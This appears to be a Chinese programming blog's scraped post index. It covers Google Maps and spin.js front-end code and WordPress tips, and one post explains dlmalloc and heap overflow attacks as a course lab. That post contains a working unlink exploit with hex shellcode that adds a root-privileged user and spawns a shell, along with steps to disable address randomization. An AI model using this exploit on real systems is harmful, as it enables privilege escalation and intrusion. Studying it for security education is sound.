class=&quot;modal-title&quot; id=&quot;myModalLabel&quot;&gt;选取locations&lt;/h4&gt; &lt;/div&gt; &lt;div class=&quot;modal-body&quot;&gt; &lt;div id=&quot;map_canvas&quot; style=&quot;width: 100%; height: 450px&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;modal-footer&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;btn btn-primary&quot; data-dismiss=&quot;modal&quot; aria-hidden=&quot;true&quot;&gt;OK&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;./googleMap.js&quot;&gt;&lt;/script&gt;&lt;script&gt;$(&quot;#google_maps_api&quot;).on(&quot;shown.bs.modal&quot;, function () &#123; googleMap.initialize(); // googleMap.maps.event.trigger(map, &quot;resize&quot;);&#125;).on(&#x27;hide.bs.modal&#x27;, function () &#123; //关闭模态框 var res = &#x27;&#x27;; for (var i in googleMap.markers) res += &#x27;(&#x27; + googleMap.markers[i].geo + &#x27;),&#x27;; res = res.substring(0,res.length-1); $(&quot;#locationText&quot;).val(res);&#125;);&lt;/script&gt; ./googleMap.js文件如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677var googleMap = &#123; map: null, markers: &#123;&#125;, currentId: 0, uniqueId: function () &#123; return ++this.currentId; &#125;, infowindow: new google.maps.InfoWindow(&#123; size: new google.maps.Size(150, 50) &#125;), initialize: function () &#123; if (this.map) return null; var myOptions = &#123; zoom: 3,//放大的倍数 center: new google.maps.LatLng(34, 103),//初始化时地图的中心 mapTypeControl: true, mapTypeControlOptions: &#123;style: google.maps.MapTypeControlStyle.DROPDOWN_MENU&#125;, navigationControl: true, mapTypeId: google.maps.MapTypeId.ROADMAP &#125;; this.map = new google.maps.Map(document.getElementById(&quot;map_canvas&quot;),myOptions); google.maps.event.addListener(this.map, &#x27;click&#x27;, function () &#123; googleMap.infowindow.close(); &#125;); google.maps.event.addListener(this.map, &#x27;click&#x27;, function (event) &#123;//点击时出现的提示窗口，这里显示经纬度 var Latitude = event.latLng.lat().toFixed(2); var longitude = event.latLng.lng().toFixed(2); googleMap.addMarker(event.latLng, &quot;name&quot;, &quot;**Location** &quot; +Latitude +&quot;,&quot;+ longitude, Latitude +&quot;,&quot;+ longitude); &#125;); //google.maps.event.addListener(this.map, &#x27;click&#x27;, function (event) &#123; // console.log(&quot;Latitude: &quot; + event.latLng.lat() + &quot; &quot; + &quot;, longitude: &quot; + event.latLng.lng()); //&#125;); &#125;, addMarker: function (Gpoint, name, contentString, geo) &#123;//添加地图上的标记 var id = this.uniqueId(); // get new id marker = new google.maps.Marker(&#123; id: id, position: Gpoint, geo : geo, map: googleMap.map, draggable: true, animation: google.maps.Animation.DROP &#125;); google.maps.event.addListener(marker, &#x27;click&#x27;, function () &#123;//添加标记 googleMap.infowindow.setPosition(this.position); googleMap.infowindow.setContent(contentString); googleMap.infowindow.open(googleMap.map, marker); &#125;); google.maps.event.trigger(marker, &#x27;click&#x27;); googleMap.map.panTo(Gpoint); this.markers[id] = marker; google.maps.event.addListener(marker, &quot;rightclick&quot;, function (point) &#123;//右键取消地图标记 googleMap.delMarker(this.id) &#125;); &#125;, delMarker: function (id) &#123;//删除标记 this.markers[id].setMap(null); delete this.markers[id]; &#125;&#125;;","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"OtherCodes","slug":"code/OtherCodes","permalink":"https://www.hrwhisper.me/categories/code/OtherCodes/"},{"name":"WEB前端","slug":"study/WEB前端","permalink":"https://www.hrwhisper.me/categories/study/WEB%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://www.hrwhisper.me/tags/Javascript/"}]},{"title":"为AJAX添加等待效果（spin.js）","slug":"spin-js-loading-effect","date":"2017-02-08T05:58:56.000Z","updated":"2021-01-08T13:42:14.033Z","comments":true,"path":"spin-js-loading-effect/","link":"","permalink":"https://www.hrwhisper.me/spin-js-loading-effect/","excerpt":"在WEB开放中，如果使用了AJAX，那么如果服务器不能马上返回结果，希望能有个等待的东西来提示用户。 spin.js就是专门用来实现等待的效果，一个效果图如下： 它主要有以下特点 非图片和CSS的扩展 不需要额外的依赖（如jQuery) 能自由的配置效果 能在绝大多数浏览器下运行（包括IE6）","text":"在WEB开放中，如果使用了AJAX，那么如果服务器不能马上返回结果，希望能有个等待的东西来提示用户。 spin.js就是专门用来实现等待的效果，一个效果图如下： 它主要有以下特点 非图片和CSS的扩展 不需要额外的依赖（如jQuery) 能自由的配置效果 能在绝大多数浏览器下运行（包括IE6） 代码示例 为了方便使用，以及加上一层遮罩层来更好的让用户明白程序没有死掉，此时需要等待， 我们可以写出如下的JS代码（loading-control.js），调用方式为： loading_control.start() //开始等待，并且创建了一个透明的遮罩层和使用了spin.js等待效果 loading_control.stop() //停止等待，遮罩层设为隐藏和并停用spin.js等待效果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * Created by hrwhisper on 2016/4/25. */var loading_control = &#123; opts: &#123; // more options: http://fgnass.github.io/spin.js/ length: 28, width: 14, radius: 42, color: &quot;#fff&quot;, scale: 0.5, opacity: 0.2, position: &quot;fixed&quot; &#125;, spinner: null, div_wait: null, div_wait_bg: null, start: function () &#123; if (!this.div_wait) &#123; var div = document.createElement(&quot;div&quot;); div.id = &quot;foo&quot;; document.body.appendChild(div); this.div_wait = div; &#125; if (!this.div_wait_bg) &#123; var div = document.createElement(&quot;div&quot;); div.id = &quot;waiting-bg&quot;; div.style.cssText = &quot;width:100%; height:100%; background-color:#000; filter:alpha(opacity=60);-moz-opacity:0.6; opacity:0.6; position:fixed; left:0px; top:0px; display:none; z-index:1000;&quot;; document.body.appendChild(div); this.div_wait_bg = div; &#125; if (!this.spinner) &#123; this.spinner = new Spinner(this.opts); &#125; this.div_wait_bg.style.display = &quot;block&quot;; this.spinner.spin(this.div_wait); &#125;, stop: function () &#123; if(this.spinner) this.spinner.stop(); this.div_wait_bg.style.display = &quot;none&quot;; &#125;&#125;; 使用例子1 假设我们是点击按钮，然后采用AJAX与服务器进行交互（下面的代码假设两秒钟），然后之后停止等待效果。 这个例子的目的是方便测试，用到了JS版本的time.sleep，详情见stackoverflow JS版本的time.sleep 12345678910111213141516171819202122232425&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;spin.js Demo&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=&quot;./spin.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./loading-control.js&quot;&gt;&lt;/script&gt; &lt;button onclick=&quot;start_do_something()&quot;&gt;开始&lt;/button&gt;&lt;script&gt;function sleep(ms) &#123; return new Promise(resolve =&gt; setTimeout(resolve, ms));&#125;async function start_do_something() &#123; #AJAX loading_control.start(); await sleep(2000); loading_control.stop();&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 使用例子2 下面是真实的ajax例子： 12345678910111213141516function get_topic_result() &#123; loading_control.start(); $.ajax(&#123; url: &#x27;stream_trends&#x27;, data: userTopicParam.getParam(), success: function (v) &#123; resultStore.update(v); loading_control.stop(); &#125;, error: function (v) &#123; console.log(v); loading_control.stop(); &#125;, dataType: &#x27;json&#x27; &#125;);&#125; 小结 本文简单的介绍spin.js，并且给了demo， spin.js的地址为http://fgnass.github.io/spin.js/","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"OtherCodes","slug":"code/OtherCodes","permalink":"https://www.hrwhisper.me/categories/code/OtherCodes/"},{"name":"WEB前端","slug":"study/WEB前端","permalink":"https://www.hrwhisper.me/categories/study/WEB%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://www.hrwhisper.me/tags/Javascript/"}]},{"title":"C动态内存管理 | Malloc 的原理 | 堆溢出攻击","slug":"c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack","date":"2017-02-01T11:18:54.000Z","updated":"2021-01-08T13:42:14.028Z","comments":true,"path":"c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/","link":"","permalink":"https://www.hrwhisper.me/c-dynamic-memory-allocation-and-the-data-struct-of-malloc-and-heap-overflow-attack/","excerpt":"本文介绍如下内容 C/C++中动态内存语句使用如malloc等 介绍dlmalloc 内存管理的实现 利用dlmalloc的数据结构进行堆溢出攻击的原理 堆溢出攻击实验","text":"本文介绍如下内容 C/C++中动态内存语句使用如malloc等 介绍dlmalloc 内存管理的实现 利用dlmalloc的数据结构进行堆溢出攻击的原理 堆溢出攻击实验 C/C++语言中动态内存语句的使用 内存分配 malloc (size_t size); 分配size个字节的内存，并返回指向该内存的指针 没有初始化所分配的内存 realloc (void *p, size_t size); 将p指向的内存块大小改为size个字节 新内配的内存没有初始化 p必须是以前调用malloc(),calloc()或者realloc()返回的结果，或者为空 p = NULL时，等价于malloc(size); calloc (size_t nmemb, size_t size); 为具有nmemb个元素的，元素大小为size的数组分配内存，返回指向分配数组的指针 新分配的内存初始化为0 C++中的new的用法比较多，举个例子把 12345int *pi = new int; //没有初始化int *p = new int(5); //初始化为5double *pd = new double(55.9);int * arr1 = new int[10] //没有初始化int * arr2= new int[10]&#123; 1,2,3 &#125;; //前三个元素初始化为1，2，3 内存释放 free (void *p); 释放p指向的内存空间，p必须是以前调用malloc(),calloc()或者realloc()返回的结果，或者为NULL p = NULL时，不执行操作 对已释放过的内存进行释放会导致危险的结果。所以一个好的编程习惯是把free后的指针设为NULL delete和delete[] 需要和new配对使用，之前的用new，则delete,之前的new [] ，则用delete[] 常见的坑 初始化问题 malloc不对分配的内存进行初始化，如果需要初始化，可以用calloc来分配，或者用memset()来初始化 初始化错误可能导致信息泄露（Information Leak） 检查返回值错误 内存分配可能会失败，需要对失败的情况进行处理 1234567int *p = (int *)malloc(sizeof(int) * 5);if (p != NULL) &#123;&#125;else &#123;&#125; C++中new可以用try catch: 123456try &#123; int *pi = new int;&#125;catch (bad_alloc) &#123;&#125; 其它 多次释放内存 如double free 1234int *x = (int *) malloc(n * sizeof(int));free(x);int *y = (int *) malloc(n * sizeof(int));free(x); 引用已经释放的内存 for (p = head; p != NULL; p = p-&gt;next) free(p); 正确的应该为： 1234for (p = head; p != NULL; p = q) &#123; q = p-&gt;next; free(p);&#125; 内存管理函数需要匹配 malloc、calloc、realloc &lt;--&gt;free new &lt;--&gt; delete new[] &lt;--&gt; delete[] malloc(0) 与平台有关，有的返回长度为0的缓冲区(MSVC），有的返回NULL， 应该避免这种，以及malloc(-1) 是malloc(2^32 - 1); 内存泄漏（Memory Leak） 已分配的没有被释放，最后可用的会使得可用内存越来越小，造成服务器宕机 dlmalloc 内存管理的实现 GNU C类库及大多数Linux版本将Doug Lea的malloc实现（dlmalloc）作为默认内存分配器，下面介绍dlmalloc中的内存管理 内存块分类 在dlmalloc中，内存块有2类，已分配块和空闲块。 空闲块通过双向链表形式组织起来 在2类块中，都用一个PREV_INUSE位来标识上一个块是否已被分配 1表示有分配，0表示没有分配 因为malloc一定为偶数，所以拿最后一个位来标记 它们的结构可以参考如下图： 空闲的双向链表如下图 空闲块合并 调用free时，空闲块可能被合并： 若该被释放的块上一块位空闲块，该会被空闲链表中解开并与被释放的块合并 如果所释放的块的下一块为空闲块，也要被解开和合并 其所用的是Unlink宏操作，从双向链表中移除一个块 123456#define unlink(P,BK,FD)&#123;\\FD &#x3D; P-&gt;fd; \\BK &#x3D; P-&gt;bk; \\FD-&gt;bk &#x3D; BK;\\BK-&gt;fd &#x3D; FD;\\&#125; 如下图 堆缓冲区溢出攻击 堆缓冲区溢出攻击比栈缓冲区溢出要难一些。堆溢出攻击常见的是通过破坏动态内存管理器所使用的数据结构，使得内存管理器在进行内存块操作时发生异常，最终导致执行攻击者提供的shellcode，如破坏数据结构来欺骗unlink宏。 如下面的的代码中存在漏洞： 12345678910111213#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main(int argc,char *argv[])&#123; char *first, *second, *third; first=malloc(666); second=malloc(12); third=malloc(12); strcpy(first, argv[1]); free(first); free(second); free(third); return 0;&#125; 在第9行free(first);时，如果下一块（程序中的第二块）内存没有被分配，那么free操作将会试图将其与第1块内存块合并。为此，需要检查第3块内存的PREV_INUSE标识。而当前块的下一块内存将其块大小作为偏移量使用 于是攻击者输入668字节长度的以上数据，第1块内存将会堆溢出，使得第2块内存中的块管理数据被覆盖 被溢出数据后覆盖的 第二个内存块构如下： 由于大小为-4，于是系统认为其下一块内存从当前内存块前4个字节开始，就是even int处所对应的4个字节，而由于其为偶数，最低位（PREV_INUSE）为0，因此系统认为第2块内存块为空闲块，因此调用unlink宏进行移除空闲链表，并进行合并。 重点来了，此时unlink操作为 FD = FUNCTION_POINTER-12; //这里的12为BK的偏移 BK = CODE_ADDRESS FD-&gt;bk = (FD + 12) = (FUNCTION_POINTER) = BK = CODE_ADDRESS 就是说*(FUNCTION_POINTER) = CODE_ADDRESS 就是 Write Anything to Anywhere! 这里CODE_ADDRESS为shellcode地址，而FUNCTION_POINTER为要覆盖的函数指针地址! 比如free函数！ 堆溢出攻击实验 实验环境 使用的系统为Read Hat Enterprise Linux 4在终端中输入cat /proc/version显示如下内核信息： Linux version 2.6.9-5.EL (bhcompile@decompose.build.redhat.com) (gcc version 3.4.3 20041212 (Red Hat 3.4.3-9.EL4)) #1 Wed Jan 5 19:22:18 EST 2005 为了完成这个实验首先关闭内存随机化 sysctl -w kernel.exec-shield-randomize=0 寻找地址 gcc -ggdb -o bugcode.o bugcode.c 然后输入objdump -R bugcode.o得到如图： 我们将free作为Function_pointer，根据上面的原理 Fd = Function_pointer -12 = 0X08049644 -12 = 0x08049638 （这里是减去十进制的12） Bk = codeAddress = first address + 8 （+8 的原因是因为first前8个字节在free过程中会被覆盖） 代码构建 我们构建680的字节： 前8个字节随意填充 shellcode（长度设置为X,这里的shellcode是创建用户名和密码都为ALI的用户） 然后填充664-8-X个字节（随意） 偶数整数 -4 补码为0xfffffffc Fd 0x08049638 BK 0x0804a010 最终代码 根据上述的步骤，构建出如下代码: 123456789101112131415161718192021222324#include &lt;stdio.h&gt; #include&lt;stdlib.h&gt; /* add user ALI with password ALI*/char shellcode[] = &quot;22222222\\x31\\xc0\\x31\\xdb\\x6a\\x0f\\x58\\x68\\x6a\\x73\\x77\\x64\\x5b\\xc1\\xeb\\x08\\x53\\x68\\x2f\\x70\\x61\\x73\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x68\\x41\\x41\\xff\\x01\\x59\\xc1\\xe9\\x08\\xc1\\xe9\\x08\\xcd\\x80\\x6a\\x0f\\x58\\x68\\x6a\\x64\\x6f\\x77\\x5b\\xc1\\xeb\\x08\\x53\\x68\\x2f\\x73\\x68\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x68\\x41\\x41\\xff\\x01\\x59\\xc1\\xe9\\x08\\xc1\\xe9\\x08\\xcd\\x80\\x6a\\x05\\x58\\x68\\x41\\x73\\x77\\x64\\x5b\\xc1\\xeb\\x08\\x53\\x68\\x2f\\x70\\x61\\x73\\x68\\x2f\\x65\\x74\\x63\\x89\\xe3\\x68\\x41\\x41\\x01\\x04\\x59\\xc1\\xe9\\x08\\xc1\\xe9\\x08\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\x68\\x41\\x73\\x68\\x0a\\x59\\xc1\\xe9\\x08\\x51\\x68\\x6e\\x2f\\x62\\x61\\x68\\x3a\\x2f\\x62\\x69\\x68\\x72\\x6f\\x6f\\x74\\x68\\x4c\\x49\\x3a\\x2f\\x68\\x3a\\x30\\x3a\\x41\\x68\\x4b\\x2e\\x3a\\x30\\x68\\x66\\x77\\x55\\x57\\x68\\x68\\x70\\x31\\x50\\x68\\x7a\\x59\\x65\\x41\\x68\\x41\\x61\\x41\\x51\\x68\\x49\\x38\\x75\\x74\\x68\\x50\\x4d\\x59\\x68\\x68\\x54\\x42\\x74\\x7a\\x68\\x51\\x2f\\x38\\x54\\x68\\x45\\x36\\x6d\\x67\\x68\\x76\\x50\\x2e\\x73\\x68\\x4e\\x58\\x52\\x37\\x68\\x39\\x4b\\x55\\x48\\x68\\x72\\x2f\\x59\\x42\\x68\\x56\\x78\\x4b\\x47\\x68\\x39\\x55\\x66\\x5a\\x68\\x46\\x56\\x6a\\x68\\x68\\x46\\x63\\x38\\x79\\x68\\x70\\x59\\x6a\\x71\\x68\\x77\\x69\\x53\\x68\\x68\\x6e\\x54\\x67\\x54\\x68\\x58\\x4d\\x69\\x37\\x68\\x2f\\x41\\x6e\\x24\\x68\\x70\\x55\\x6e\\x4d\\x68\\x24\\x36\\x24\\x6a\\x68\\x41\\x4c\\x49\\x3a\\x89\\xe1\\xba\\x41\\x41\\x41\\x7f\\xc1\\xea\\x08\\xc1\\xea\\x08\\xc1\\xea\\x08\\xcd\\x80\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\x68\\x59\\x59\\x59\\x59\\x68\\x58\\x58\\x58\\x58\\x68\\x2f\\x73\\x68\\x42\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\x88\\x43\\x07\\x89\\x5b\\x08\\x89\\x43\\x0c\\xb0\\x0b\\x8d\\x4b\\x08\\x8d\\x53\\x0c\\xcd\\x80\\xb0\\x01\\xb3\\x01\\xcd\\x80&quot;&quot;22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222&quot;&quot;\\x22\\x22\\x22\\x22&quot;&quot;\\xfc\\xff\\xff\\xff&quot;&quot;\\x38\\x96\\x04\\x08&quot;&quot;\\x10\\xa0\\x04\\x08&quot;; int main() &#123; //(*(void(*)()) shellcode)(); char *first,*second,*third; first=malloc(666); second=malloc(12); third=malloc(12); memcpy(first,shellcode,sizeof(shellcode)); free(first); free(second); free(third); return 0; &#125; 几点说明： 这里为了方便实验，直接把shellcode设为数组，而不是原来的argv[1]，然后使用的是memcpy函数 最后那个even int为了方便gdb查看，填充的是 查看代码效果 gcc -ggdb -z execstack -g -o a test.c gdb a 用gdb设置断点，然后查看second附近的内存 覆盖前 覆盖后 由于上面代码的shellcode是创建用户名和密码都为ALI的用户，我们可以用如下的命令查看效果： tail /etc/passwd 运行前 ./a 运行后 实际上，上面的代码中malloc(668)同样能执行^ ^ 参考资料 RUC 《程序设计安全》 - 梁彬","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"信息安全","slug":"study/信息安全","permalink":"https://www.hrwhisper.me/categories/study/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"heap","slug":"heap","permalink":"https://www.hrwhisper.me/tags/heap/"},{"name":"Linux","slug":"Linux","permalink":"https://www.hrwhisper.me/tags/Linux/"}]},{"title":"三个 wordpress 技巧","slug":"wordpress-comment-email-notice-and-wordpress-latex-and-wordpress-reward","date":"2017-01-28T09:02:58.000Z","updated":"2021-01-08T13:42:14.039Z","comments":true,"path":"wordpress-comment-email-notice-and-wordpress-latex-and-wordpress-reward/","link":"","permalink":"https://www.hrwhisper.me/wordpress-comment-email-notice-and-wordpress-latex-and-wordpress-reward/","excerpt":"本文时wordpress三个技巧集合，内容包括 wordpress评论回复邮件通知 wordpress下支持latex的方法 wordpress打赏模块","text":"本文时wordpress三个技巧集合，内容包括 wordpress评论回复邮件通知 wordpress下支持latex的方法 wordpress打赏模块 评论回复邮件通知 不用多说好久，因为之前经常挂+之前不支持https(现在好像支持了)+吞了我的评论。 评论本博客的可以发现，本博客有评论回复通知，怎么做到的呢？ 其实很简单，在当前主题的functions.php中添加如下（要在第八第九行填入你的邮箱账号和密码）： 12345678910111213141516171819202122232425262728293031323334353637&#x2F;&#x2F; 使用smtp发邮件function mail_smtp( $phpmailer ) &#123; $phpmailer-&gt;IsSMTP(); $phpmailer-&gt;SMTPAuth &#x3D; true; $phpmailer-&gt;Port &#x3D; 465; $phpmailer-&gt;SMTPSecure &#x3D; &quot;ssl&quot;; $phpmailer-&gt;Host &#x3D; &quot;smtp.qq.com&quot;; $phpmailer-&gt;Username &#x3D; &quot;&quot;; $phpmailer-&gt;Password &#x3D; &quot;&quot;;&#125;add_action(&#39;phpmailer_init&#39;, &#39;mail_smtp&#39;); &#x2F;&#x2F;comment_mail_notifyfunction comment_mail_notify($comment_id) &#123; $blogname &#x3D; wp_specialchars_decode(get_option(&#39;blogname&#39;), ENT_QUOTES); $comment &#x3D; get_comment($comment_id); $parent_id &#x3D; $comment-&gt;comment_parent ? $comment-&gt;comment_parent : &#39;&#39;; $spam_confirmed &#x3D; $comment-&gt;comment_approved; if (($parent_id !&#x3D; &#39;&#39;) &amp;&amp; ($spam_confirmed !&#x3D; &#39;spam&#39;)) &#123; $wp_email &#x3D; &#39;no-replay@hrwhisper.me&#39;; $to &#x3D; trim(get_comment($parent_id)-&gt;comment_author_email); $subject &#x3D; &#39;您在 [&#39;.$blogname.&#39;] 中的留言有了新的回复&#39;; $message &#x3D; &#39;&lt;div style&#x3D;&quot;color:#555;font:12px&#x2F;1.5 微软雅黑,Tahoma,Helvetica,Arial,sans-serif;width:650px;margin:50px auto;border-top: none;box-shadow:0 0px 3px #aaaaaa;&quot; &gt;&lt;div style&#x3D;&quot;background-color:white;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-padding:0 15px 12px;width:650px;color:#555555;font-family:微软雅黑, Arial;;font-size:12px;&quot;&gt;&lt;h2 style&#x3D;&quot;border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:8px 0 10px 8px;&quot;&gt;&lt;span style&#x3D;&quot;color: #12ADDB;font-weight: bold;&quot;&gt;&gt; &lt;&#x2F;span&gt;您在 &lt;a style&#x3D;&quot;text-decoration:none; color:#58B5F5;font-weight:600;&quot; href&#x3D;&quot;&#39;.home_url().&#39;&quot;&gt;&#39;.$blogname.&#39;&lt;&#x2F;a&gt; 博客上的留言有回复啦！(｡◕‿◕｡)&lt;&#x2F;h2&gt;&lt;div style&#x3D;&quot;padding:0 12px 0 12px;margin-top:18px&quot;&gt; &lt;p&gt;您好, &#39;.trim(get_comment($parent_id)-&gt;comment_author).&#39;! 您发表在文章 《&#39;.get_the_title($comment-&gt;comment_post_ID).&#39;》 的评论:&lt;&#x2F;p&gt; &lt;p style&#x3D;&quot;background-color: #EEE;border: 1px solid #DDD;padding: 20px;margin: 15px 0;&quot;&gt;&#39;.nl2br(strip_tags(get_comment($parent_id)-&gt;comment_content)).&#39;&lt;&#x2F;p&gt; &lt;p&gt;&#39;.trim($comment-&gt;comment_author).&#39; 给您的回复如下:&lt;&#x2F;p&gt; &lt;p style&#x3D;&quot;background-color: #EEE;border: 1px solid #DDD;padding: 20px;margin: 15px 0;&quot;&gt;&#39;.nl2br(strip_tags($comment-&gt;comment_content)).&#39;&lt;&#x2F;p&gt; &lt;p&gt;您可以点击 &lt;a style&#x3D;&quot;text-decoration:none; color:#5692BC&quot; href&#x3D;&quot;&#39;.htmlspecialchars(get_comment_link($parent_id)).&#39;&quot;&gt;这里查看回复的完整內容&lt;&#x2F;a&gt; &lt;&#x2F;p&gt; &lt;p&gt; 感谢您对 &lt;a style&#x3D;&quot;text-decoration:none; color:#5692BC&quot; href&#x3D;&quot;&#39;.home_url().&#39;&quot;&gt;&#39;.$blogname.&#39;&lt;&#x2F;a&gt; 的关注，如您有任何疑问，欢迎在博客留言，我会一一解答噢~( •̀ ω •́ )y &lt;&#x2F;p&gt; &lt;p style&#x3D;&quot;padding-bottom: 15px;&quot;&gt;(此邮件由系统自动发出, 请勿回复)&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&#39;; $from &#x3D; &quot;From: \\&quot;&quot;.get_option(&#39;blogname&#39;).&quot;\\&quot; &lt;$wp_email&gt;&quot;; $headers &#x3D; &quot;$from\\nContent-Type: text&#x2F;html; charset&#x3D;&quot;.get_option(&#39;blog_charset&#39;).&quot;\\n&quot;; wp_mail($to, $subject, $message, $headers); &#125;&#125;add_action(&#39;comment_post&#39;, &#39;comment_mail_notify&#39;); 效果如下： Wordpress latex wordpress默认没有支持latex，这让我们打公式的时候无比的蛋疼。比如上次我写的线性规划的那篇《线性规划-单纯形算法详解》，在本地用typora写好后，然后再将公式截图成图片，然后在上传，无比的蛋疼和麻烦，而且后期更新公式更加麻烦了。 有没有直接让wordpress支持latex的办法呢？ 答案时有的，就是安装插件！这里时mathjax-latex 安装后，进入设置页面如下： 一些说明： 如果勾选Force Load，那么在任何页面都会加载mathjax.js，消耗比较大，建议在有公式的页面中写上 [mathjax]标签即可。一个该标签放置的位置如下（并且我放在read more tag后面，主页也不会加载） 一般而言，我们直接使用MathJax的CDN即可。如果要用本地的，将Use MathJax CDN Service的勾去掉，然后在Custom MathJax location中填入地址即可。 使用方法 多行方式 以两个\\(作为起始和终止，需要注意的注意起始的两个\\)后面紧接公式第一行，而最后的两个$不要另起一行（否则wordpress可能自动插入段落）。 如 1$$\\sum_&#123;n&#x3D;1&#125;^Na_n$$ 效果如下： \\[ \\sum_{n=1}^Na_n \\] 单行的形式 在括号对前分别加，例如: 1\\(\\sum_&#123;n&#x3D;1&#125;^Na_n\\) 效果为： \\(\\sum_{n=1}^Na_n\\) 打赏模块 可以看到本博客开启了打赏模块，你可以先移动到文章后面有个红色的按钮体验一下。 ：） 其源代码如下： 123456789101112131415161718192021222324252627282930313233function support_me_html()&#123; $message &#x3D; array(&quot;您的支持将鼓励我继续创作！&quot;,&quot;听说帅的人已经打赏了&quot;,&quot;打赏一杯咖啡钱呗&quot;); $before &#x3D; &lt;&lt;&lt;STR &lt;div class&#x3D;&quot;row text-center&quot; style&#x3D;&quot;padding: 50px 0;border-top: 1px dashed #E7E7E7;&quot;&gt; &lt;b&gt;&lt;p style&#x3D;&quot;font-size:18px;&quot;&gt;STR; $after &#x3D; &lt;&lt;&lt;STR &lt;&#x2F;p&gt;&lt;&#x2F;b&gt;&lt;button data-toggle&#x3D;&quot;modal&quot; data-target&#x3D;&quot;#myModal&quot; class&#x3D;&quot;btn btn-danger btn-lg&quot; style&#x3D;&quot;padding:8px 16px;font-weight:bold;&quot;&gt;打赏&lt;&#x2F;button&gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;modal fade&quot; id&#x3D;&quot;myModal&quot; tabindex&#x3D;&quot;-1&quot; role&#x3D;&quot;dialog&quot; aria-labelledby&#x3D;&quot;myModalLabel&quot; aria-hidden&#x3D;&quot;true&quot;&gt; &lt;div class&#x3D;&quot;modal-dialog&quot; style&#x3D;&quot;max-width:400px&quot;&gt; &lt;div class&#x3D;&quot;modal-content&quot;&gt; &lt;div class&#x3D;&quot;modal-body&quot;&gt; &lt;button type&#x3D;&quot;button&quot; class&#x3D;&quot;close&quot; data-dismiss&#x3D;&quot;modal&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&amp;times;&lt;&#x2F;button&gt; &lt;ul id&#x3D;&quot;myTab&quot; class&#x3D;&quot;nav nav-tabs&quot;&gt; &lt;li class&#x3D;&quot;active&quot;&gt; &lt;a href&#x3D;&quot;#wechat_pay_div&quot; data-toggle&#x3D;&quot;tab&quot;&gt; 微信 &lt;&#x2F;a&gt; &lt;&#x2F;li&gt; &lt;li&gt;&lt;a href&#x3D;&quot;#alipay_div&quot; data-toggle&#x3D;&quot;tab&quot;&gt; 支付宝 &lt;&#x2F;a&gt;&lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;div id&#x3D;&quot;myTabContent&quot; class&#x3D;&quot;tab-content&quot;&gt; &lt;div class&#x3D;&quot;tab-pane fade in active&quot; id&#x3D;&quot;wechat_pay_div&quot;&gt; &lt;img src&#x3D;&quot;&#x2F;images&#x2F;wechat_pay.png&quot; alt&#x3D;&quot;wechat_pay&quot; &gt; &lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;tab-pane fade&quot; id&#x3D;&quot;alipay_div&quot;&gt; &lt;img src&#x3D;&quot;&#x2F;images&#x2F;alipay.jpg&quot; alt&#x3D;&quot;alipay&quot; &gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt;&lt;!-- &#x2F;.modal-content --&gt; &lt;&#x2F;div&gt;&lt;!-- &#x2F;.modal --&gt; &lt;&#x2F;div&gt;STR; echo $before.$message[array_rand($message,1)].$after;&#125; 上述的代码使用了随机输出的模式 需要bootstrap才行，因为用到了模态框Modal 二维码图片存放在了/images/下 $message数组可以自行修改内容得到不一样的输出效果。 使用方法 上述的代码添加到当前主题文件的functions.php 在你的主题下输出文章页面（我的是content-single.php）中适当的位置添加 1&lt;?php support_me_html(); ?&gt; 其它 其它的比如用百度分享来让浏览的用户进行分享，但是其不支持https，可以见我另一篇博文：百度分享不支持https的解决方案","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"}]},{"title":"验证码简介 